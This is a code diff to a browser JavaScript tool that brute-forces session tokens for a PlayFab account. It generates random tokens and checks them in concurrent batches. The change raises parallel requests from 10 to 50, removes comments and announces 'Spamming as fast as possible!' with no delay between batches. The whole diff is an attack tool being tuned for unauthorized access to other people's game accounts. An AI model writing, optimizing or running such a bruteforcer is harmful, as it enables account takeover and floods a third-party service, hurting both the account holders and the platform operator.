@@ -1542,15 +1542,15 @@ async function startBruteforce() {
   }
 
   bruteforceRunning = true;
-  failedAttempts = 0; // Reset failed attempts counter
-  foundValid = false; // Reset foundValid flag
-  output.textContent = "Token bruteforcer enabled! We will notify you when we find a valid token.\n";
+  failedAttempts = 0;
+  foundValid = false;
+  output.textContent = "Token bruteforcer enabled! Spamming as fast as possible!\n";
 
   async function tryTokenBatch() {
     if (!bruteforceRunning) return;
 
     const batchSize = 1000; // Keep batch size at 1000
-    const subBatchSize = 10; // 10 concurrent requests (browser limit)
+    const subBatchSize = 50; // Push to 50 concurrent requests
     const tokens = Array.from({ length: batchSize }, generateRandomToken);
     const outputBuffer = [];
 
@@ -1558,11 +1558,9 @@ async function startBruteforce() {
     for (let i = 0; i < tokens.length; i += subBatchSize) {
       if (!bruteforceRunning) break;
 
-      // Get the current sub-batch
       const subBatch = tokens.slice(i, i + subBatchSize);
       const results = await Promise.all(subBatch.map(token => checkToken(playFabId, token)));
 
-      // Process results
       for (const { token, result, error } of results) {
         if (error) {
           outputBuffer.push(`Error for token ${token}: ${error}`);
@@ -1576,13 +1574,12 @@ async function startBruteforce() {
       }
     }
 
-    // Update output after the full batch
+    // Update output only for errors or valid tokens
     if (outputBuffer.length > 0) {
       output.textContent += outputBuffer.join('\n') + '\n';
       output.scrollTop = output.scrollHeight;
     }
 
-    // Continue to the next batch immediately if no valid token found
     if (!foundValid && bruteforceRunning) {
       setTimeout(tryTokenBatch, 0); // No delay between batches
     } else if (foundValid) {
